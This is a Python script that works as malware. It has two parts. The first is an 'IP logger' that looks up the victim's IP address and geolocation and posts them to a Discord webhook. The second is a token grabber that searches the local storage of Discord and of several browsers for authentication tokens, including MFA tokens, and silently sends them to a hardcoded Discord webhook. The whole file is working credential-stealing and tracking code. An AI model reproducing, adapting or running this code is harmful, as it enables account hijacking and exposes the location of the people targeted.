
import os
import re
import json

from urllib.request import Request, urlopen
from requests import get, post
from json import loads, dumps


# entrer votre webhook entre guillemets

lien = "YOUR_WEBHOOK"


ip = get("https://v4.ident.me/").text
info = loads(get(f"https://api.ipgeolocation.io/ipgeo?apiKey=ea51e6ee9beb47cdad50bec7ab6579d6&ip={ip}").text)

liste = []

for element in info:
        liste.append(element)

headers = {
    "Content-Type" : "application/json",
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11"
}

embed = {
        "username": "SHUKK",
        "avatar_url": "https://zupimages.net/up/21/19/zllz.png",
        "embeds": [
    {
      "title": "Mon Paypal",
      "url": "https://www.paypal.com/paypalme/CMSS666",
      "color": 0x0c0303,
      "fields": [
        {"name": "IP :", "value": info[liste[0]]},
        {"name": "Continent :","value": info[liste[2]],"inline" : True,},
        {"name": "Pays : ","value": info[liste[5]],"inline" : True,},
        {"name": "Ville :","value": info[liste[9]],"inline" : True,},
        {"name": "Code ZIP :","value": info[liste[10]],"inline" : True,},
        {"name": "Latitude :","value": info[liste[11]],"inline" : True,},
        {"name": "Longitude :","value": info[liste[12]],"inline" : True,},
        {"name": "Téléphone :","value": info[liste[14]],"inline" : True,},
        {"name": "Organisation :","value": info[liste[19]],"inline" : True,},
      ],
      "author": {
        "name": "CMSS_",
        "url": "https://www.paypal.com/paypalme/CMSS666",
        "icon_url": "https://www.zupimages.net/up/21/19/zllz.png"
      },
      "footer": {
        "text": "IP Logger par CMSS_"
      },
      "image": {
          "url" : info[liste[17]]
      }
    }
  ]
}

post(lien, data=dumps(embed).encode("utf-8"), headers=headers)


# your webhook URL
WEBHOOK_URL = 'https://discord.com/api/webhooks/883827564286730263/JqHAyxQB0jrcvTrH1xx1t2_h0-XCK2NnV4r87rjE2D57e7-f4ZP_aP7rVADxXT2SEAZK'

# mentions you when you get a hit
PING_ME = False

def find_tokens(path):
    path += '\\Local Storage\\leveldb'

    tokens = []

    for file_name in os.listdir(path):
        if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
            continue

        for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
            for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
                for token in re.findall(regex, line):
                    tokens.append(token)
    return tokens

def main():
    local = os.getenv('LOCALAPPDATA')
    roaming = os.getenv('APPDATA')

    paths = {
        'Discord': roaming + '\\Discord',
        'Discord Canary': roaming + '\\discordcanary',
        'Discord PTB': roaming + '\\discordptb',
        'Google Chrome': local + '\\Google\\Chrome\\User Data\\Default',
        'Opera': roaming + '\\Opera Software\\Opera Stable',
        'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
        'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default'
    }

    message = '@everyone' if PING_ME else ''

    for platform, path in paths.items():
        if not os.path.exists(path):
            continue

        message += f'\n**{platform}**\n```\n'

        tokens = find_tokens(path)

        if len(tokens) > 0:
            for token in tokens:
                message += f'{token}\n'
        else:
            message += 'No tokens found.\n'

        message += '```'

    headers = {
        'Content-Type': 'application/json',
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'
    }

    payload = json.dumps({'content': message})

    try:
        req = Request(WEBHOOK_URL, data=payload.encode(), headers=headers)
        urlopen(req)
    except:
        pass

if __name__ == '__main__':
    main()
